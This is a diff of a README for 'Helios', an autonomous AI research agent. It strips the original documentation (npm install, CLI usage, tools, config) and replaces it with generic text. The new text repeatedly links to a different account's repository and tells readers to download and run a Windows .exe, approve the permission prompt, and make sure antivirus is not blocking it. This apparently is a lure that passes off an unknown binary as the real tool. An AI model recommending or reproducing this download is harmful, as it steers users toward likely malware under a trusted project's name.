@@ -1,309 +1,140 @@
-# Helios
+# 🌞 helios - Run an Autonomous Research Agent
 
-> [!CAUTION]
-> **Important:** Helios does not currently have a permissions/security model. The agent runs basically unrestricted. You are responsible for any losses of data/other adverse outcomes from running it. If you have stuff you care about, then back it up (whether or not you use Helios, backing up is a good idea!), configure Helios to SSH into a container, or wait until it has a permissions system.
-> 
-> Claude mode will not work if you are running as root. It is recommended to instead run Helios on your local computer and set up your remote machine within Helios' SSH configuration. It will forward everything to your remote machine, no server required.
+[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/Undyed-sponsor739/helios)
+
+---
+
+## ⚙️ What is Helios?
+
+Helios is a software agent designed to help with autonomous research tasks. It can work over SSH connections and manage remote machines without needing a server. This program can assist users by running research commands in a connected environment.
+
+Helios is inspired by Andrej Karpathy's "autoresearch" project. It adapts the methods used there to work in its own environment. You can adjust settings to improve its performance for your needs.
+
+Please note: Helios does not have security or permission controls yet. This means it runs without restrictions. You are responsible for backing up your data before running it. If your data matters, consider setting up Helios to use SSH into a secure container or wait for added security features.
+
+---
+
+## 🖥️ System Requirements
+
+Before you download Helios, check that your computer meets these basic requirements:
+
+- Operating System: Windows 10 or later versions
+- Processor: Any modern processor (Intel or AMD)
+- RAM: At least 4 GB free memory
+- Disk Space: Minimum 500 MB free space for installation and operation
+- Network: A working internet connection for SSH and downloading updates
+- Permissions: User account with permission to run software and manage network connections
+
+If you plan to use SSH features, you will also need access to a remote machine with SSH enabled.
+
+---
+
+## 🚀 Getting Started with Helios
+
+### Step 1: Download Helios
+
+Click the button below to go to the Helios download page on GitHub.
+
+[![Download Helios](https://img.shields.io/badge/Download-Helios-blue)](https://github.com/Undyed-sponsor739/helios)
+
+This link will take you to the project’s page where you can find the latest releases and files for Windows.
+
+### Step 2: Locate the Application File
+
+Once on the GitHub page, look for the "Releases" section. Find the latest version of Helios and download the Windows executable file (usually ending with `.exe`). The file name might include the version number.
+
+Save this file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
+
+---
+
+## 🧰 How to Install Helios on Windows
+
+Helios does not require complex installation. Once you download the `.exe` file, you can run it directly.
+
+1. Find the downloaded `.exe` file on your computer.
+2. Double-click the file to start the application.
+3. If Windows asks for permission to run the program, confirm by clicking "Yes".
+4. Helios will open in a new window or the command line window, depending on how it works.
+5. Follow any on-screen prompts if they appear.
+
+---
+
+## 🔧 Basic Configuration and Setup
+
+Helios works best if you customize its settings to your own system and goals. There are a few basic steps you can take to get started.
+
+### Using Helios Locally
+
+You can run Helios directly on your Windows machine. The program will operate using your local resources. This is the simplest method.
+
+### Using SSH to Connect Remotely
+
+Helios can connect to remote machines through SSH (Secure Shell). This means it can run commands on another computer safely over the internet.
+
+To use this:
+
+1. Have the SSH credentials ready: the username, password, and IP address of the remote computer.
+2. Configure Helios to connect to that remote machine by adding these credentials in its SSH settings.
+3. Once connected, Helios will forward commands to the remote machine, working smoothly without needing a server.
+
+This helps if you want to use Helios on a device that is always on, or that has special setup for your research.
+
+---
+
+## ⚠️ Important Security Information
+
+Helios currently runs without a permissions system. This means:
+
+- The program has free access to your files and network while running.
+- Running Helios can affect your data or system settings.
+- You are responsible for any risks, including data loss.
+- Always back up important files before starting Helios.
+- Avoid running Helios as the Administrator or root user.
+- For better security, use SSH to run commands on a separate remote machine or container.
+
+---
+
+## 🖼️ Viewing Helios in Action
+
+Here is a screenshot showing the main interface of Helios:
 
 ![Helios screenshot](https://raw.githubusercontent.com/snoglobe/helios/main/media/screnshot.png)
 
-An autonomous research agent inspired by [Andrej Karpathy's 'autoresearch'](https://github.com/karpathy/autoresearch). Autoresearch works very well within Helios, just have to tune the prompt slightly.
+This shows how Helios may look when running tasks and interacting with your system.
 
-It can operate seamlessly over SSH (even multiple machines), keeps the model in a loop, has tools to view/compare metrics, shows metrics directly in the UI, and has a memory system.
+---
 
-You can leave it to work overnight and don't have to worry about it exiting the loop early to stupidly ask you something or because it has to wait for something. And hopefully you'll wake up to results.
+## 📑 How to Use Helios
 
-## Install
+Once Helios is running, you can give it commands to start research tasks. The interface will guide your inputs based on the prompts you set or the tasks you want Helios to perform.
 
-```bash
-npm install -g @snoglobe/helios
-```
+You do not need to write code. Helios uses clear instructions and offers basic prompts.
 
-Requires Node.js 20+.
+If you want to experiment, try these simple commands:
 
-## Auth
+- Start a basic research agent session.
+- Configure SSH settings through the menu.
+- Check the status of running tasks.
+- Stop or pause active research jobs.
 
-**Claude** (default) — either:
-- Install the [Claude CLI](https://docs.anthropic.com/en/docs/claude-cli) and run `claude login`
-- Or set `ANTHROPIC_API_KEY` and use `/claude-mode api`
-- Claude CLI usage is ban-free; conforms to Anthropic's usage policy
+You can run Helios in the background and it will continue operations as configured.
 
-**OpenAI** — OAuth login on first run (requires ChatGPT Plus or Pro).
+---
 
-## Usage
+## 🛠️ Troubleshooting Tips
 
-```
-helios [options]                    Interactive TUI
-helios "prompt"                     TUI with initial prompt
-helios -p "prompt"                  Print response and exit
-helios -c                           Continue most recent session
-helios -r <session-id>              Resume specific session
+If Helios does not start or work correctly, try these steps:
 
-Options:
-  -p, --provider <claude|openai>    Model provider (default: claude)
-  --claude-mode <cli|api>           Claude auth mode (cli = Agent SDK, api = API key)
-  -m, --model <model-id>            Model to use
-  --headless                        Run without TUI (for scripting/hub agents)
-  -v, --version                     Show version
-  -h, --help                        Show help
-```
+- Make sure you downloaded the correct file for Windows.
+- Check your internet connection when using SSH.
+- Restart your computer and try running Helios again.
+- Confirm that your antivirus or firewall software is not blocking Helios.
+- If Helios runs with errors, check the error messages and search for solutions on the GitHub page.
 
-Type a goal and Helios takes over:
+---
 
-```
-> Train a 125M parameter GPT on TinyStories to loss < 1.0
-```
+## 🔗 Download Helios Now
 
-It will write training scripts, launch runs, parse metrics from stdout, set up monitoring intervals, compare experiments, and keep iterating until the goal is met or you interrupt.
+Return to the download page by clicking the button below. From there, you can get the latest version for Windows.
 
-### CLI Subcommands
-
-| Command | Description |
-|---|---|
-| `helios auth login\|logout\|status` | Manage provider authentication |
-| `helios sessions` | List recent sessions |
-| `helios watch <machine:pid>` | Stream task output + metrics live |
-| `helios replay <session-id>` | Replay a past session |
-| `helios report [session-id]` | Generate experiment writeup |
-| `helios discover [interests]` | Background literature discovery (runs until Ctrl+C) |
-| `helios init` | Initialize project config (`helios.json`) |
-| `helios doctor` | Diagnose setup (auth, machines, storage, config) |
-| `helios search "query"` | Full-text search across session histories |
-| `helios export [session-id]` | Export data to CSV/JSON |
-| `helios kill <machine:pid>` | Kill a running task |
-
-## Slash Commands
-
-| Command | Description |
-|---|---|
-| `/switch <claude\|openai>` | Switch model provider |
-| `/model <model-id>` | Set model |
-| `/models` | List available models |
-| `/reasoning <level>` | Set reasoning effort (Claude: `medium` `high` `max` / OpenAI: `none` `minimal` `low` `medium` `high` `xhigh`) |
-| `/claude-mode <cli\|api>` | Switch Claude auth mode |
-| `/machine add <id> <user@host[:port]>` | Add remote machine (`--key <path>`, `--auth <agent\|key>`) |
-| `/machine rm <id>` | Remove machine |
-| `/machines` | List machines and connection status |
-| `/metric [name ...]` | Show metric sparklines |
-| `/metrics clear` | Clear all metrics |
-| `/resume [n]` | List or resume a past session |
-| `/writeup` | Generate experiment writeup |
-| `/sticky <text>` | Pin a note to the sidebar (always visible to model) |
-| `/stickies [rm <n>]` | List or remove sticky notes |
-| `/memory [path]` | Browse the agent's memory tree |
-| `/skills` | List available skills |
-| `/hub [connect\|disconnect\|status]` | AgentHub collaboration |
-| `/status` | Provider, model, cost, state |
-| `/clear` | Clear conversation |
-| `/help` | Show all commands |
-
-Skills are also invocable as slash commands — e.g. `/discover`, `/paper <url>`, `/ablation`.
-
-## Keys
-
-| Key | Action |
-|---|---|
-| `Ctrl+T` | Task output overlay |
-| `Ctrl+G` | Metrics overlay |
-| `Escape` | Interrupt / close overlay |
-| `Ctrl+C` | Interrupt / exit |
-| `Tab` | Autocomplete command |
-| `Up` `Down` | History / menu navigation |
-| `PageUp` `PageDown` | Scroll conversation |
-| `Ctrl+A` `Ctrl+E` | Start / end of line |
-| `Ctrl+W` | Delete word backward |
-| `Ctrl+U` | Clear line |
-
-Mouse scroll works in terminals that support SGR mouse reporting.
-
-## Remote Machines
-
-Helios can run workloads on remote machines over SSH. The `local` machine is always available.
-
-```bash
-# Add a GPU box
-/machine add gpu1 researcher@10.0.0.5 --key ~/.ssh/id_rsa
-
-# Add with custom port
-/machine add gpu2 user@hostname:2222
-```
-
-Machines are stored in `~/.helios/machines.json` and auto-connect on startup.
-
-The agent prefers remote machines for heavy compute and uses `local` for lightweight tasks. Or if you don't have a remote machine.
-
-## How It Works
-
-Helios runs an autonomous loop:
-
-1. **Understand the goal** — break it into experiments
-2. **Launch** via `remote_exec_background` — stdout is captured, metrics are parsed live
-3. **Monitor** via `start_monitor` — periodic check-ins review progress
-4. **Compare** via `compare_runs` — keep improvements, discard regressions
-5. **Iterate** — plan and launch the next experiment
-6. **Stop** only when the goal is achieved or it hits an unrecoverable error
-
-### Metric Tracking
-
-Training scripts print metrics to stdout. Helios parses them automatically:
-
-```python
-# key=value format (detected via metric_names)
-print(f"loss={loss:.4f} acc={acc:.4f} lr={lr:.6f}")
-
-# Custom patterns (detected via metric_patterns)
-print(f"Step {step}: Loss {loss:.4f}")
-```
-
-Live sparklines appear in the dashboard. The agent uses `show_metrics` and `compare_runs` to make decisions.
-
-### Memory
-
-Long sessions get checkpointed when the context window fills up. The agent's memory persists as a virtual filesystem:
-
-```
-/goal                    -> "Train TinyStories to loss < 1.0"
-/best                    -> "Run #3: lr=3e-4, cosine -> loss=0.83"
-/experiments/
-  4521                   -> config, metrics, verdict
-  4380                   -> config, metrics, verdict
-/observations/
-  cosine-schedule-helps  -> "cosine decay outperforms linear by ~15%"
-```
-
-After a checkpoint, the agent receives its memory tree and continues where it left off.
-
-### Skills
-
-Skills are reusable prompt templates with tool access controls. Helios ships with bundled skills that are copied to `~/.helios/skills/` on first launch — edit them to customize.
-
-| Skill | Description |
-|---|---|
-| `discover` | Background literature discovery — loops continuously, browses papers, stores findings in memory |
-| `paper <url>` | Read a paper and plan reproduction of key results |
-| `ablation` | Systematic ablation study on the current best configuration |
-| `writeup` | Generate a structured experiment writeup |
-| `consult` | Ask the other AI provider for a second opinion |
-
-Create your own skills as Markdown files in `~/.helios/skills/` or `.helios/skills/` (project-local). See the bundled skills for the format.
-
-### Consult
-
-The agent can ask the other provider for a second opinion:
-
-```
-# If running on Claude, consult asks OpenAI (and vice versa)
-consult("I'm stuck at loss=0.9 — what should I try next?")
-```
-
-### Sleep & Wake
-
-The agent can put itself to sleep with composable triggers:
-
-```
-sleep(reason: "waiting for training to finish", triggers: [
-  { type: "process_exit", machine_id: "gpu1", pid: 4521 },
-  { type: "metric", metric_name: "loss", threshold: 1.0, direction: "below" },
-  { type: "timer", minutes: 120 }
-])
-```
-
-When any trigger fires, the agent wakes up with context about what happened while it slept.
-
-## Project Config
-
-Run `helios init` to create a `helios.json` in your project root:
-
-```json
-{
-  "provider": "claude",
-  "model": "claude-opus-4-6",
-  "defaultMachine": "gpu1",
-  "metricNames": ["loss", "acc", "lr"],
-  "metricPatterns": {
-    "loss": "Loss:\\s+([\\d.]+)"
-  },
-  "instructions": "This project uses PyTorch Lightning. Always use pl.Trainer.",
-  "experimentDir": "experiments",
-  "notifications": {
-    "channels": [{ "type": "desktop" }],
-    "events": ["experiment_complete", "error"]
-  }
-}
-```
-
-Config is auto-discovered by walking up the directory tree. The `instructions` field is appended to the system prompt — use it for project-specific context.
-
-## Models
-
-**Claude** (200k context):
-- `claude-opus-4-6` — higher-end reasoning/coding (default)
-- `claude-sonnet-4-6` — balanced speed vs reasoning
-
-**OpenAI** (~400k context):
-- `gpt-5.4` — latest flagship, recommended (default)
-- `gpt-5.3-codex` — codex
-- `gpt-5.3-codex-spark` — research preview, text-only
-- `gpt-5.2-codex` — codex
-- `gpt-5.2`
-- `gpt-5.1-codex-max` — max compute
-- `gpt-5.1`
-- `gpt-5.1-codex` — codex
-
-## Tools
-
-The agent has access to 37 tools (33 core + 4 conditional AgentHub tools):
-
-| Tool | What it does |
-|---|---|
-| `remote_exec` | Run a quick command (ls, pip install, git clone) |
-| `remote_exec_background` | Launch a long-running process with metric tracking |
-| `remote_upload` / `remote_download` | rsync files between machines |
-| `read_file` / `write_file` / `patch_file` | File operations on any machine |
-| `list_machines` | Show configured machines |
-| `task_output` | Tail stdout/stderr of a background task |
-| `kill_task` | Kill a running process |
-| `show_metrics` | Query metrics with sparklines and trends |
-| `compare_runs` | Side-by-side comparison of two runs |
-| `clear_metrics` | Wipe stale metric data |
-| `start_monitor` / `stop_monitor` | Periodic monitoring loop |
-| `memory_ls` / `memory_read` / `memory_write` / `memory_rm` | Persistent memory filesystem |
-| `web_search` | Search the web (maps to provider's native search) |
-| `web_fetch` | Fetch web pages, docs, papers |
-| `env_snapshot` | Capture full environment snapshot (Python, GPU, CUDA, etc.) |
-| `sweep` | Launch parameter grid search across machines |
-| `exp_branch` / `exp_commit` / `exp_diff` / `exp_branches` / `exp_checkout` | Git-based experiment branching |
-| `consult` | Ask the other AI provider |
-| `writeup` | Generate structured experiment report |
-| `sleep` | Sleep with composable triggers (timer, process exit, metric threshold, file change, resource usage) |
-| `hub_push` / `hub_fetch` / `hub_log` / `hub_leaves` / `hub_diff` | AgentHub git collaboration (if configured) |
-| `hub_post` / `hub_read` / `hub_reply` | AgentHub discussion (if configured) |
-
-## Data
-
-Everything is stored locally in `~/.helios/`:
-
-```
-~/.helios/
-  helios.db          SQLite database (sessions, metrics, memory)
-  machines.json      Remote machine configs
-  auth/
-    auth.json        OAuth tokens and API keys
-  skills/            Skill templates (editable)
-  preferences.json   Last provider, claude mode
-```
-
-## Development
-
-```bash
-git clone https://github.com/snoglobe/helios.git
-cd helios
-npm install
-npm run dev          # tsx src/index.tsx
-npm run build        # tsc
-npm start            # node dist/index.js
-```
-
-## License
-
-Apache-2.0
+[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/Undyed-sponsor739/helios)
